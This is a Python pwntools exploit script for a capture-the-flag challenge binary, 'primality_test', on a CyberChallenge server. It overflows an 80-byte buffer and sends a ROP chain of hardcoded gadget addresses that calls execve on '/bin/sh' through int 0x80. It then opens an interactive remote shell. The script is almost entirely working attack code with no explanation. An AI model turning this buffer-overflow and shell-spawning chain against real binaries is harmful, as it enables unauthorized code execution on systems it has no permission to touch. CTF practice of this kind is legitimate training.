#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template primality_test --host rop.challs.cyberchallenge.it --port 9130
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'primality_test')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'rop.challs.cyberchallenge.it'
port = int(args.PORT or 9130)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
break *0x08048875
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()


pop_eax_int_80 = p32(0x08048606)
bin_sh = p32(0x08048991)
pop_ebx_ecx = p32(0x08048609)
pop_edx = p32(0x0804860c)

offset = 80

payload = b'a' * offset + pop_ebx_ecx + bin_sh + p32(0x0) + pop_edx + p32(0x0) + pop_eax_int_80 + p32(0x0b)

io.sendlineafter(b'number: ', payload)

io.interactive()

